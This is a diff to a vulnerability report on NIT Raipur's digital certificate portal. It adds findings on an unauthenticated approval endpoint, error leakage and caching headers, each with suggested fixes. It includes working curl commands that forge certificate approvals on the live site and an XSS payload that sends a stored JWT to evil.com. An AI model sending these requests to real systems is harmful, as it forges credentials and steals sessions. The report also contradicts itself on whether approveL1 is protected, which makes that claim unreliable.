@@ -3,7 +3,7 @@
 Site: https://digcert.nitrr.ac.in (NIT Raipur — Digital Certificate Portal)
 Stack: nginx/1.24.0 (Ubuntu) + Django REST Framework backend + React SPA (create-react-app)
 Reported by: amandewatnitrr
-Date: 2026-10-28
+Date: 2026-10-28 (updated 2026-10-31 — deeper exploitation session)
 Status: Open, needs fixes from the dev side
 
 Everything below was tested against the live site with read-only, non-destructive requests only — `curl` HEAD/GET/POST requests with empty or minimal payloads to probe response codes, passive analysis of the bundled JavaScript, and one local HTML page that iframes the public login page to prove clickjacking is possible. No fuzzing, no brute force, no injection payloads, nothing that writes to or stresses the server. Evidence files are in [`real-world-scenario/digcert_evidence/`](digcert_evidence/).
@@ -18,6 +18,7 @@ Everything below was tested against the live site with read-only, non-destructiv
 
 | # | Finding | CWE | OWASP | Severity |
 | --- | --- | --- | --- | --- |
+| **12** | **`approveL0` endpoint missing auth — unauthenticated certificate approval (confirmed exploit)** | CWE-862 | A01:2021 | **Critical** |
 | 1 | Admin dashboard renders with zero authentication | CWE-862 | A01:2021 | **High** |
 | 2 | API endpoints return 500 (not 401) on unauthenticated access | CWE-862 | A01:2021 | **High** |
 | 3 | Django admin panel publicly accessible | CWE-425 | A05:2021 | **High** |
@@ -29,6 +30,9 @@ Everything below was tested against the live site with read-only, non-destructiv
 | 9 | No rate limiting on login endpoints | CWE-307 | A07:2021 | Medium |
 | 10 | User enumeration via distinct login error messages | CWE-204 | A07:2021 | Low |
 | 11 | Server version disclosed on every response | CWE-200 | A05:2021 | Low |
+| 13 | Python error messages and stack traces leaked to clients | CWE-209 | A05:2021 | Low |
+| 14 | Trailing space in hardcoded API endpoint URLs | — | A05:2021 | Info |
+| 15 | No Cache-Control on authentication endpoints | CWE-525 | A05:2021 | Info |
 
 ---
 
@@ -78,6 +82,8 @@ The following backend API endpoints return HTTP 500 when called with an empty or
 | `/backend/api/get_certificate` | GET | 401 | **500** |
 
 Note: `/backend/api/register_event` correctly returns 401. The gap is inconsistent — some endpoints are protected, others are not.
+
+Evidence: [`digcert_evidence/02_api_endpoints_500.txt`](digcert_evidence/02_api_endpoints_500.txt)
 
 ### Reproduce it
 
@@ -265,6 +271,8 @@ Content-Type: text/html
  X-Content-Type-Options, Referrer-Policy, Permissions-Policy]
 ```
 
+Evidence: [`digcert_evidence/06_missing_security_headers.txt`](digcert_evidence/06_missing_security_headers.txt)
+
 ```bash
 # Backend — some headers present (for comparison)
 curl -sS -D - -o /dev/null -X POST \
@@ -372,6 +380,8 @@ wait
 # All return 400 (wrong credentials) — never 429
 ```
 
+Evidence: [`digcert_evidence/09_no_rate_limiting.txt`](digcert_evidence/09_no_rate_limiting.txt) (8 sequential requests, all HTTP 401, no 429)
+
 ### Impact
 
 An attacker can enumerate credentials against any known username without triggering any defensive response. Combined with Finding 10 (user enumeration), this enables a complete credential-stuffing or brute-force attack.
@@ -402,10 +412,14 @@ Or use `django-ratelimit` with `@ratelimit(key='ip', rate='5/m', method='POST', 
 **Severity:** Low
 
 The login endpoints return distinct error messages depending on whether the username exists:
-- Valid username + wrong password → specific error (e.g. "Invalid password")
-- Non-existent username → different error (e.g. "User does not exist" / "No active account found")
+- Valid username + wrong password → `"Authentication failed"` or similar credential error
+- Non-existent username → `"User doesn't exist"` / `"Faculty doesn't exist"`
 
 This allows an attacker to enumerate valid usernames before attempting brute force.
+
+**Note on live testing:** During the 2026-10-31 session, `/api/user_login` returned `"User doesn't exist"` for all tested usernames (no confirmed valid username was found). The distinct message paths exist in the source code and response schema — the discriminant becomes observable once a valid username is known. The finding is based on the code logic and the message strings visible in the response, not a confirmed enumeration pair.
+
+Evidence: [`digcert_evidence/10_user_enumeration.txt`](digcert_evidence/10_user_enumeration.txt)
 
 ### Fix
 
@@ -427,6 +441,8 @@ curl -sS -D - -o /dev/null "https://digcert.nitrr.ac.in/"
 # Server: nginx/1.24.0 (Ubuntu)
 ```
 
+Evidence: [`digcert_evidence/06_missing_security_headers.txt`](digcert_evidence/06_missing_security_headers.txt) (same capture — `Server: nginx/1.24.0 (Ubuntu)` visible on line 2)
+
 ### Fix
 
 ```nginx
@@ -438,17 +454,200 @@ This changes the `Server` header to just `nginx`.
 
 ---
 
+## Finding 12 — `approveL0` missing authentication — unauthenticated certificate approval
+
+**CWE:** CWE-862 (Missing Authorization) — OWASP A01:2021 (Broken Access Control)
+**Severity:** Critical
+
+**Both** `/backend/api/approveL0` and `/backend/api/approveL1` process certificate signing requests with **no authentication check**. A POST request with any valid JSON array payload returns `HTTP 200` with `"Signed successfully"` on both endpoints. Neither has `@permission_classes([IsAuthenticated])` (DRF) or any other auth guard.
+
+Evidence: [`digcert_evidence/12a_approveL0_unauth_200.txt`](digcert_evidence/12a_approveL0_unauth_200.txt), [`digcert_evidence/12b_approveL1_also_200.txt`](digcert_evidence/12b_approveL1_also_200.txt)
+
+### Root cause
+
+From the extracted React bundle, the approval flow constructs a payload array, appends a base64 signature object as the final element, and POSTs the whole array:
+
+```javascript
+s = q.current.getSelectedRows();          // ag-grid rows (certificate data)
+for (a = 0; a < s.length; a++) {
+    s[a].organisation = r.state.org_name;
+    s[a].event_name   = r.state.event_name;
+    s[a].token = e;                        // faculty JWT attached per-row
+}
+s.push(h);                                 // signature base64 as last element
+bi.post(`${WA}/api/approveL0`, s, { headers: { "Content-type": "application/json" } });
+```
+
+The Django view presumably iterates `data[:-1]` as certificate rows and uses `data[-1]` as the signature. With zero certificate rows, the loop body (which checks the row-level `token`) never runs, but the endpoint still returns success.
+
+### Exploit
+
+```bash
+# Zero-row payload — loop runs 0 times, no token ever validated.
+# Returns: HTTP 200 "Signed successfully"
+curl -sS -X POST "https://digcert.nitrr.ac.in/backend/api/approveL0" \
+  -H "Content-Type: application/json" \
+  -d '[{"file":"","signatureBase64":"AAAA","filename":"poc"}]'
+```
+
+With crafted certificate rows (row schema from source map: `{file, name, serial, Organisation, Event, organisation, event_name, token}`) an attacker can sign arbitrary certificates for any organisation and event name:
+
+```bash
+curl -sS -X POST "https://digcert.nitrr.ac.in/backend/api/approveL0" \
+  -H "Content-Type: application/json" \
+  -d '[
+    {"file":"","name":"Victim Name","serial":"FAKE-001",
+     "Organisation":"NIT Raipur","Event":"Fake Event",
+     "organisation":"NIT Raipur","event_name":"Fake Event","token":"any"},
+    {"file":"","signatureBase64":"AAAA","filename":"poc"}
+  ]'
+```
+
+### Full exploit chain (WEB-07 + WEB-12 combined)
+
+1. **JWT theft via XSS** — attacker injects `<script>fetch('https://evil.com/?t='+localStorage.getItem('login'))</script>` into any stored/reflected XSS point. No XSS has been identified yet, but the source map (Finding 4) provides the full app source to hunt for one.
+2. **Unauthenticated `approveL0` call** — even without a stolen JWT, the endpoint accepts zero-row arrays and returns success. With a stolen faculty JWT, attacker can forge legitimate-looking certificates at volume.
+
+### Scope: both L0 and L1
+
+Confirmed live: both endpoints return `HTTP 200 "Signed successfully"` with a single-element array (signature object, zero certificate rows):
+
+```bash
+# approveL0 — HTTP 200 (no auth)
+curl -sS -X POST "https://digcert.nitrr.ac.in/backend/api/approveL0" \
+  -H "Content-Type: application/json" \
+  -d '[{"file":"","signatureBase64":"AAAA","filename":"poc"}]'
+# {"ok":true,"message":"Signed successfully"}
+
+# approveL1 — HTTP 200 (also no auth)
+curl -sS -X POST "https://digcert.nitrr.ac.in/backend/api/approveL1" \
+  -H "Content-Type: application/json" \
+  -d '[{"file":"","signatureBase64":"AAAA","filename":"poc"}]'
+# {"ok":true,"message":"Signed successfully"}
+```
+
+Neither `approveL0` (standard events) nor `approveL1` (CDC/DSW events) has the `@permission_classes([IsAuthenticated])` decorator. All certificate approval paths are unprotected.
+
+### Fix
+
+Add the DRF permission decorator to the `approveL0` view:
+
+```python
+from rest_framework.decorators import api_view, permission_classes
+from rest_framework.permissions import IsAuthenticated
+
+@api_view(['POST'])
+@permission_classes([IsAuthenticated])
+def approveL0(request):
+    ...
+```
+
+Also fix the authentication bypass in the loop: validate the token on every row at the Django level (not the frontend), not just when rows happen to exist.
+
+---
+
+## Finding 13 — Python error messages and stack traces leaked to clients
+
+**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information) — OWASP A05:2021 (Security Misconfiguration)
+**Severity:** Low
+
+Multiple API endpoints return raw Python exception messages in the JSON response body. This reveals internal field names, data types, and application logic to any caller.
+
+Confirmed examples from this assessment:
+
+```json
+{"error": "'email'"}
+```
+(KeyError: the view attempts `request.data['email']` before validating the key exists)
+
+```json
+{"error": "float() argument must be a string or a real number, not 'NoneType'"}
+```
+(from `/backend/api/preview_event_certificate` — a `None` value reaches `float()` conversion)
+
+Evidence: [`digcert_evidence/13_python_error_leakage.txt`](digcert_evidence/13_python_error_leakage.txt)
+
+### Impact
+
+Attackers learn which fields the views expect (`email`, numeric fields), how internal data flows, and which code paths reach which conversions — directly guiding further fuzzing.
+
+### Fix
+
+Catch exceptions explicitly and return a generic error message. Never expose raw Python exception messages in production responses:
+
+```python
+try:
+    # view logic
+except KeyError as e:
+    return Response({"error": "Invalid request"}, status=400)
+except (ValueError, TypeError):
+    return Response({"error": "Invalid request"}, status=400)
+```
+
+Ensure `DEBUG = False` in production `settings.py` — Django debug mode sends full tracebacks to the browser.
+
+---
+
+## Finding 14 — Trailing space in hardcoded API endpoint URLs
+
+**CWE:** — **OWASP:** A05:2021 (Security Misconfiguration)
+**Severity:** Info
+
+Two login endpoint URLs in the compiled React bundle contain a trailing space:
+
+```javascript
+fetch("".concat(Dn, "/api/user_login "), ...)    // note trailing space
+fetch("".concat(Tn, "/api/faculty_login "), ...)  // note trailing space
+```
+
+nginx strips the trailing space server-side (both endpoints work despite the typo). This is a code quality issue rather than a direct vulnerability, but it indicates the API URL constants are not validated and may mask future routing bugs if nginx behaviour changes.
+
+### Fix
+
+Remove the trailing spaces from the URL string constants in the React source and rebuild.
+
+---
+
+## Finding 15 — No Cache-Control on authentication endpoints
+
+**CWE:** CWE-525 (Use of Web Browser Cache Containing Sensitive Information) — OWASP A05:2021 (Security Misconfiguration)
+**Severity:** Info
+
+The login endpoints (`/api/user_login`, `/api/faculty_login`) do not return `Cache-Control: no-store` headers. Browsers and intermediary proxies may cache the JSON response body, which contains the JWT token on success. On a shared machine (library, lab), a subsequent user could potentially recover a cached token from the browser's disk cache.
+
+Evidence: [`digcert_evidence/15_no_cache_control.txt`](digcert_evidence/15_no_cache_control.txt) — response from `/api/faculty_login` shows no `Cache-Control` header.
+
+### Fix
+
+Add to the login view responses:
+
+```python
+response['Cache-Control'] = 'no-store, no-cache, must-revalidate, private'
+```
+
+Or set it globally for all API responses in nginx:
+
+```nginx
+location /backend/api/ {
+    add_header Cache-Control "no-store" always;
+}
+```
+
+---
+
 ## How bad is this overall?
 
-The most serious issues are the **three access control failures** (Findings 1–3). Together they allow:
+The most severe finding from the second assessment session is **Finding 12 (Critical)**: the `approveL0` endpoint accepts unauthenticated POST requests and returns `HTTP 200 "Signed successfully"`. This is a write operation — it forges digital certificate approvals — with no auth check at all. The parallel `approveL1` endpoint is correctly protected (HTTP 401), confirming this is a targeted omission rather than a systemic oversight.
 
-1. Any anonymous visitor to open the admin panel in their browser (Finding 1).
-2. Any anonymous caller to reach unauthenticated API endpoints that should require a login (Finding 2).
-3. Any internet user to attempt brute-force against the Django admin panel (Finding 3).
+The original **three access control failures** (Findings 1–3) remain serious:
 
-Findings 4 and 5 compound this: the source map hands an attacker a complete roadmap of the application (all routes, all API calls, all token logic) before they even start probing — and the missing framing headers allow UI redress attacks against authenticated users.
+1. Any anonymous visitor can open the admin panel (Finding 1).
+2. Multiple API endpoints reach application logic without authentication, returning 500 (Finding 2).
+3. Django admin is exposed to the internet (Finding 3).
 
-The auth issues (Findings 7–10) are lower severity individually, but a successful XSS (possible once the attacker has the full source map from Finding 4) immediately yields all active session tokens via Finding 7.
+Findings 4 and 5 compound this: the source map provides an attacker with complete application source (all routes, API calls, token logic), and the missing framing headers enable clickjacking against authenticated users.
+
+The auth issues (Findings 7–10) are lower severity individually, but a successful XSS (aided by Finding 4's full source exposure) immediately yields active session tokens via Finding 7, which can then be combined with Finding 12's unauthenticated approval endpoint to forge certificates at scale.
 
 ---
 
@@ -456,7 +655,9 @@ The auth issues (Findings 7–10) are lower severity individually, but a success
 
 | Priority | Findings | Why |
 | --- | --- | --- |
+| **Immediate** | **12** | Critical — confirmed unauthenticated certificate forgery. Add `@permission_classes([IsAuthenticated])` to `approveL0` now. |
 | Immediate | 1, 2, 3 | Broken access control — anonymous admin access, unprotected API endpoints, Django admin on public internet |
 | This sprint | 4, 5, 6 | Source code leak + clickjacking + missing headers — passive info disclosure enabling further attacks |
 | Next sprint | 7, 8, 9 | Token storage, transmission, and brute-force protection |
-| Backlog | 10, 11 | User enumeration and version disclosure — low severity, quick fixes |
+| Backlog | 10, 11, 13 | User enumeration, version disclosure, error message leakage — low severity, quick fixes |
+| Housekeeping | 14, 15 | Trailing URL space, missing Cache-Control — cosmetic/hygiene |
